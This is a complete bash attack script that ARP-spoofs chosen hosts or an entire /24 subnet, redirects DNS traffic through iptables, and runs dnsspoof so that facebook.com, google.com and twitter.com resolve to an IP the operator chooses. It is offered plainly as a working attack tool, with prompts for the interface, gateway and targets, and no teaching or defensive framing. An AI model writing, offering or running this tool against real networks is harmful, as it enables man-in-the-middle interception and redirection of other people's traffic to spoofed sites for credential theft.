#!/bin/bash

# DNS Redirection Script with Multiple Targeting Options
# Redirects DNS requests to your specified DNS server

# Colors for better output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

# Check if running as root
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}[-] This script must be run as root${NC}" >&2
    exit 1
fi

# Check for required tools
check_dependencies() {
    local missing=0
    for cmd in arpspoof dnsspoof iptables; do
        if ! command -v $cmd &> /dev/null; then
            echo -e "${RED}[-] Error: $cmd is not installed${NC}"
            missing=1
        fi
    done
    
    if [ $missing -eq 1 ]; then
        echo -e "${YELLOW}[+] Try: sudo apt install dsniff iptables${NC}"
        exit 1
    fi
}

# Validate IP address format
validate_ip() {
    local ip=$1
    if [[ ! $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo -e "${RED}[-] Invalid IP format: $ip${NC}"
        return 1
    fi
    return 0
}

# Get multiple targets from user input
get_multiple_targets() {
    while true; do
        read -p "[+] Enter target IPs (comma separated): " targets_input
        IFS=',' read -ra target_array <<< "$targets_input"
        
        all_valid=true
        for target in "${target_array[@]}"; do
            if ! validate_ip "$target"; then
                all_valid=false
                break
            fi
        done
        
        if $all_valid; then
            break
        else
            echo -e "${YELLOW}[!] Please enter valid IP addresses${NC}"
        fi
    done
    
    echo "${target_array[@]}"
}

# Create spoofing host file
create_hostfile() {
    echo -e "${GREEN}[+] Creating DNS spoofing host file...${NC}"
    echo "$dns_server facebook.com" > host.txt
    echo "$dns_server *.facebook.com" >> host.txt
    echo "$dns_server google.com" >> host.txt
    echo "$dns_server *.google.com" >> host.txt
    echo "$dns_server twitter.com" >> host.txt
    echo "$dns_server *.twitter.com" >> host.txt
    # Add more domains as needed
}

# Start the attack
start_attack() {
    local targets=("$@")
    
    echo -e "${GREEN}[+] Enabling IP forwarding...${NC}"
    echo 1 > /proc/sys/net/ipv4/ip_forward

    echo -e "${GREEN}[+] Configuring iptables rules...${NC}"
    iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53

    echo -e "${GREEN}[+] Starting ARP spoofing...${NC}"
    for target in "${targets[@]}"; do
        if [ "$target" != "$gateway_ip" ] && [ "$target" != "$dns_server" ]; then
            echo -e "${YELLOW}[+] Targeting $target${NC}"
            arpspoof -i "$interface" -t "$target" "$gateway_ip" > /dev/null 2>&1 &
        fi
    done

    echo -e "${GREEN}[+] Starting DNS spoofing...${NC}"
    dnsspoof -i "$interface" -f host.txt > /dev/null 2>&1 &

    echo -e "\n${GREEN}[+] Attack running! DNS requests are being redirected.${NC}"
    echo -e "${YELLOW}[+] Press Ctrl+C to stop...${NC}"
}

# Cleanup function
cleanup() {
    echo -e "\n${GREEN}[+] Cleaning up...${NC}"
    pkill -f arpspoof
    pkill -f dnsspoof
    iptables -t nat -F PREROUTING
    echo -e "${GREEN}[+] Cleanup complete. Goodbye!${NC}"
    exit 0
}

# Main execution
check_dependencies

echo -e "\n${GREEN}=== DNS Redirection Tool ===${NC}"

# Get network configuration
while true; do
    read -p "[+] Enter your network interface (e.g., wlan0): " interface
    if ip link show "$interface" &> /dev/null; then
        break
    else
        echo -e "${RED}[-] Interface $interface not found${NC}"
    fi
done

while true; do
    read -p "[+] Enter your gateway IP (e.g., 192.168.1.1): " gateway_ip
    if validate_ip "$gateway_ip"; then
        break
    fi
done

while true; do
    read -p "[+] Enter your DNS server IP (e.g., 192.168.1.100): " dns_server
    if validate_ip "$dns_server"; then
        break
    fi
done

# Target selection menu
echo -e "\n${YELLOW}=== Target Selection ===${NC}"
echo "1) Single target IP"
echo "2) Multiple target IPs"
echo "3) All IPs in subnet (excluding gateway and DNS server)"
read -p "[+] Select targeting mode (1-3): " choice

case $choice in
    1)
        while true; do
            read -p "[+] Enter target IP: " target_ip
            if validate_ip "$target_ip"; then
                targets=("$target_ip")
                break
            fi
        done
        ;;
    2)
        targets=($(get_multiple_targets))
        ;;
    3)
        subnet=$(echo "$gateway_ip" | cut -d'.' -f1-3)
        echo -e "${YELLOW}[+] Targeting all devices in subnet: $subnet.0/24${NC}"
        targets=()
        for i in {1..254}; do
            target_ip="$subnet.$i"
            targets+=("$target_ip")
        done
        ;;
    *)
        echo -e "${RED}[-] Invalid selection${NC}"
        exit 1
        ;;
esac

create_hostfile
start_attack "${targets[@]}"

# Trap Ctrl+C and run cleanup
trap cleanup INT

# Keep script running
while true; do
    sleep 1
done
